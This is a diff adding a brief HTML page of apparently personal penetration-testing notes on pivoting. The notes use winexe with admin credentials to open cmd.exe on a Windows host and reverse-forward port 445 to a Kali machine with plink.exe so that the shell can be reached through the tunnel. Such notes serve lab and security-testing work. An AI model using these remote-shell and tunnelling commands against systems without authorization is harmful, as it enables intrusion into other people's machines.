@@ -1,0 +1,36 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>port forwarding</title>
+</head><body>In the cases we need to forward a prot on Kali to the internal port on windows<br/>
+<br/>
+winexe -U "admin%password" //&lt;windows ip&gt; cmd.exe<br/>
+if can't access, try this port forwarding<br/>
+<br/>
+plink.exe<br/>
+<br/>
+<br/>
+[kali linux]<br/>
+<br/>
+/etc/ssh/sshd_config<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+service ssh restart<br/>
+<br/>
+<br/>
+<br/>
+[windows]<br/>
+<br/>
+.\plink.exe root@&lt;kali linux ip&gt; -R 445:127.0.0.1:445<br/>
+<br/>
+<img src="image 2.png" width="368" height="250" /><br/>
+<br/>
+<b>try ssh tunnel if plink can't<br/>
+<br/>
+<br/>
+retry access port 445<br/>
+<br/>
+winexe -U "admin%password" //127.0.0.1 cmd.exe<br/>
+</b></body></html>
